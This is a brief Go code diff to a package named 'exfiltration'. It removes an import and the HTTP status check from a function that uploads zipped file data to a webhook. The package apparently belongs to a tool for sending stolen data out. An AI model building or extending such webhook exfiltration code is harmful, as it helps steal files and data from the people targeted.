@@ -3,7 +3,6 @@ package exfiltration
 import (
 	"bytes"
 	"encoding/json"
-	"fmt"
 	"io"
 	"mime/multipart"
 	"net/http"
@@ -48,10 +47,6 @@ func PostFileWebhook(webhookURL string, zipBytes []byte, filename string, data *
 		return err
 	}
 	defer resp.Body.Close()
-
-	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-		return fmt.Errorf("%d", resp.StatusCode)
-	}
 
 	return nil
 }
